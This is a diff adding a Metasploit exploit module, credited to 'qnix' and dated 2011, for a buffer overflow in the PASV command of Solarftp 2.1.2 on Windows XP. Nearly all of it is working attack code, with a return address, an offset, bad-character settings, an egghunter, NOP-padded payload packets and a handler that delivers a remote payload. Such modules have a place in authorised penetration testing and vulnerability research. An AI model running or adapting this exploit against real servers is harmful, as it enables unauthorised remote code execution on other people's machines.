@@ -1,0 +1,85 @@
+# Exploit Title: Solarftp v2.1.2 PASV buffer overflow
+# Date: Aug 17, 2011
+# Author: qnix
+# Software Link: http://solarftp.com/files/solarftps-setup.exe
+# Version: 2.1.2
+# Tested on: Windows XP Universal
+# Detailed info: http://0x80.org/blog/?p=545
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+	include Msf::Exploit::Remote::Ftp
+	include Msf::Exploit::Remote::Egghunter
+	
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Solarftp 2.1.2 PASV Command Buffer Overflow',
+			'Description'    => %q{
+				This module exploits a buffer overflow in the PASV command in Solarftp 2.1.2
+				You must have valid credentials to trigger this vulnerability. Also, you
+				ony get one chance.
+			},
+			'Author'         => 'qnix',
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'URL', 'http://0x80.org/blog/?p=545'],
+				],
+			'DefaultOptions' =>
+				{
+					'WfsDelay' => 45,
+					'EXITFUNC' => 'thread',
+				},
+			'Payload'        =>
+				{
+					'Space'    => 1000,
+					'BadChars' => "\x00\x20\x0a\x0d",
+					'StackAdjustment'       => -3500,
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+													   #1001BD23   . FFE0   JMP EAX  @sfsweb.dll
+					[ 'Windows XP Universal',       { 'Ret' => 0x1001BD23, 'Offset' => 195} ],
+				],
+			'DisclosureDate' => 'Aug 17 2011',
+			'DefaultTarget'  => 0))
+	end
+
+
+	def exploit
+		connect_login
+		print_status("Trying target #{target.name}")
+
+		print_status("Creating Egg Hunter")
+		eggoptions =
+		{
+		:checksum => true,
+		:eggtag   => "W00T"
+		}
+		hunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)
+		
+		fix = "\x11" 		# To fix some left overs from uncontrolled buffer
+							# to avoid access violation.
+		pk1 = make_nops(75)
+		pk1 << fix
+		pk1 << make_nops(20)
+		pk1 << hunter
+		pk1 << make_nops((100-fix.length-hunter.length))
+		pk1 << [target.ret].pack('V')
+		pk1 << egg
+		pk1 << make_nops(6631-[target.ret].length-target['Offset']-egg.length)
+		print_status("Sending first packet...")
+		send_cmd( ["PASV",pk1], false)
+		
+		pk2 = make_nops(3000)
+		print_status("Sending second packet...")
+		send_cmd( ["PASV",pk2], false)
+		
+		handler
+		disconnect
+	end
+
+end
